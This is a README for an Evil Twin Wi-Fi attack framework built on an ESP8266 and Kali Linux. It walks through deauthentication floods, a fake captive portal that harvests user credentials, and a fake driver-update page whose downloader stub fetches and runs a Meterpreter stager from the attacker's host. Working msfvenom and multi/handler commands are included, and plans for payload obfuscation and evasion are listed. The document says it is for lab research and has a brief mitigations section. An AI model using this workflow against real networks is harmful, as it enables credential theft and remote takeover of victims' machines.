# Evil Twin + MITM Framework with ESP8266 and Kali Linux

## Overview

This project provides a proof-of-concept Evil Twin attack framework combining an **ESP8266** microcontroller and **Kali Linux** to automate deployment of fake Wi-Fi access points (APs), captive portals for credential harvesting, and future integration of a Metasploit payload dropper. It is intended for controlled lab environments and security research to demonstrate risks in public Wi-Fi setups and explore defensive measures.

## Features

* **ESP8266 Fake AP**: Custom firmware on ESP8266 controlled via serial to clone target SSID/BSSID and manage deauthentication floods.
* **Automation Scripts**: Bash scripts on Kali orchestrate reconnaissance (Aircrack-ng), deauth attacks (Aireplay-ng), and fake AP startup via serial commands.
* **Realistic Captive Portal**: “Secure WiFi Authentication” HTML/CSS/JS page served by ESP8266, logging credentials on `/connect` POST and providing LED feedback.
* **Redirect Mechanism**: After credential submission, redirect victims (\~5s delay) to a Kali-hosted `update.html` page mimicking an update prompt.
* **Logging & Monitoring**: Centralized logs of MAC addresses, SSID/BSSID, timestamps, and harvested credentials for analysis.
* **Future MSF Payload Dropper**: Framework to integrate Metasploit payload delivery via a “WiFiUpdate” stub and Meterpreter listener on Kali.
* **Ethical & Defensive Guidance**: Documentation of lab-safe testing procedures, cleanup scripts, and mitigations (user training, VPN, DNS monitoring, anomaly detection).


## Prerequisites

* **Hardware**:

  * ESP8266-based board (e.g., NodeMCU, Wemos D1 Mini) with sufficient GPIO for LED, serial pins.
  * USB cable to connect ESP8266 to Kali host.
  * Wi-Fi adapter on Kali supporting monitor mode and packet injection.

* **Software**:

  * **Kali Linux** (or Debian-based pentesting environment) with:

    * `aircrack-ng` suite (Aircrack-ng, Aireplay-ng)
    * `hostapd` (if used in alternative AP flows)
    * `dnsmasq` or equivalent DNS server (for DNS spoofing if required)
    * Apache or simple HTTP server on Kali for hosting `update.html` and payload stubs
    * Metasploit Framework (`msfvenom`, `msfconsole`)
    * Bash, Python (optional for scripts), tools like `curl`/`wget`
  * **ESP8266 Toolchain**:

    * Arduino IDE or PlatformIO for building/flashing custom firmware
    * ESP8266 core libraries (ESP8266WiFi, DNSServer, ESPAsyncWebServer or WebServer)



## Setup Instructions

Follow these steps to configure and run the proof-of-concept in a lab:

### 1. Build & Flash ESP8266 Firmware

1. Open the ESP8266 firmware project in Arduino IDE or PlatformIO.
2. Configure Wi-Fi AP behavior:

   * Clone SSID/BSSID from serial input.
   * Implement DNSServer to redirect all DNS to ESP8266 IP.
   * Host captive portal HTML/CSS/JS on ESP webserver, including `/connect` POST route.
3. Compile and flash to ESP8266 board via USB.
4. Connect LED to a GPIO pin for visual feedback on credential capture.

### 2. Configure Kali Linux Environment

1. Ensure Wi-Fi adapter is in monitor mode (`airmon-ng start wlan0`).
2. Install necessary tools: `sudo apt update && sudo apt install aircrack-ng dnsmasq apache2 metasploit-framework`.
3. Prepare Apache directory:

   * Place `update.html` and payload stubs (e.g., `WiFiUpdate.bat`) in `/var/www/html/` or custom virtual host.
4. Set file permissions appropriately.

### 3. Serial Communication & Automation Scripts

1. Identify serial port (e.g., `/dev/ttyUSB0`).
2. Example to send commands:

   ```bash
   stty -F /dev/ttyUSB0 raw speed 115200
   echo -ne "TARGET:${ESSID}|${BSSID}|${CHANNEL}\n" > /dev/ttyUSB0
   echo -ne "START_AP\n" > /dev/ttyUSB0
   ```
3. In `start_attack.sh`, integrate:

   * Reconnaissance: `airodump-ng` or scanning for target SSID/BSSID.
   * Deauth: `aireplay-ng --deauth ...` to force clients off legitimate AP.
   * Serial commands to ESP8266 to start fake AP.
   * Logging: record SSID/BSSID, client MACs, timestamps.
4. Provide a `cleanup.sh` to stop deauth, revert monitor mode, and reset the ESP if needed.

### 4. Captive Portal Behavior

* On ESP8266, DNSServer intercepts DNS and routes all requests to ESP’s webserver.
* Captive portal HTML:

  * Presents a login-like form (e.g., “Secure WiFi Authentication”).
  * POST `/connect`: capture fields (e.g., username/password), log via `Serial.println()`, blink LED.
  * After logging, respond with JS to `fetch('/connect')` then delay (\~5s) before `window.location` to Kali’s `update.html`.
* Ensure proper Content-Type headers.

### 5. Kali-hosted `update.html` & Payload Stub

* **update.html**: Simple page with title “Wi-Fi Driver Update” or similar, message prompting download.
* Provide a downloader stub (e.g., `WiFiUpdate.bat`) that:

  * Runs a PowerShell or curl command to fetch Metasploit payload from Kali (e.g., `http://<KALI_IP>/payloads/stager.exe`).
  * Executes the downloaded payload.
* Host payload binaries or scripts in Apache’s document root or protected directory.

### 6. Metasploit Listener (Future Integration)

* Use `msfvenom` to generate a stager payload (e.g., `windows/meterpreter/reverse_https`) with obfuscation options:

  ```bash
  msfvenom -p windows/meterpreter/reverse_https LHOST=<KALI_IP> LPORT=443 -f exe -o /var/www/html/payloads/stager.exe
  ```
* In Metasploit console (`msfconsole`):

  ```ruby
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_https
  set LHOST <KALI_IP>
  set LPORT 443
  set ExitOnSession false
  exploit -j -z
  ```
* Ensure firewall allows incoming connections on chosen port.

### 7. Logging & Monitoring

* On ESP8266: use `Serial.println()` to output captured credentials and client info.
* On Kali: scripts append logs to `logs/harvested_credentials.log` with format: `timestamp, ESSID, BSSID, client_MAC, credential_data`.
* Optionally, implement a simple parser or dashboard script to review logs (e.g., Python script to parse CSV and display recent entries).

### 8. Cleanup & Teardown

* Stop deauth processes: kill Aireplay-ng, disable monitor mode: `airmon-ng stop wlan0mon`.
* Reset ESP8266 by sending reset command or power cycle.
* Remove or disable Apache-hosted payloads if not needed.
* Clear logs or archive them securely.

## Future Enhancements

* **Automated Payload Dropper**: Integrate script that, upon credential capture, triggers `msfvenom` to generate fresh payload and updates `update.html`/payload stub dynamically.
* **Cross-Platform Stagers**: Develop Linux/macOS payload scripts (e.g., shell scripts, Mach-O payloads) for broader proof-of-concept coverage.
* **Improved UX/UI**: Enhance captive portal and update pages with minimal branding, fake progress bars, dynamic version info to increase believability.
* **Advanced Obfuscation**: Use encoding/encryption in stager payloads, multi-stage delivery, and evasion techniques.
* **Defensive Tooling**: Create detection scripts that monitor for suspicious captive portal behaviors or unexpected downloads after Wi-Fi join; demo for defenders.
* **Dashboard & Visualization**: Build a web-based dashboard (e.g., Flask or Node.js) on Kali to display live logs, client statuses, and manage Metasploit sessions.

## Security & Defensive Considerations

* **Detection**: Monitor DNS for wildcard responses, track HTTP downloads immediately after association, inspect endpoints for unexpected executables/scripts.
* **Mitigations**: Enforce HTTPS-only flows where possible, use VPNs on public Wi-Fi, train users to avoid running unexpected downloads.
* **Isolation**: Always isolate testing network and devices; avoid exposing lab environment to the internet.

## Usage Example

1. Flash ESP8266 firmware.
2. On Kali, open terminal:

   ```bash
   ./kali-scripts/start_attack.sh --target-ssid "CoffeeShopWiFi" --channel 6
   ```
3. Watch ESP8266 serial output: it logs captured credentials.
4. Victim connects to fake AP, submits credentials, and is redirected to `http://<KALI_IP>/update.html`.
5. Victim clicks “Download Update,” runs stub, and Metasploit listener catches a Meterpreter session (future integration).
6. After testing, run `./kali-scripts/cleanup.sh` to revert environment.

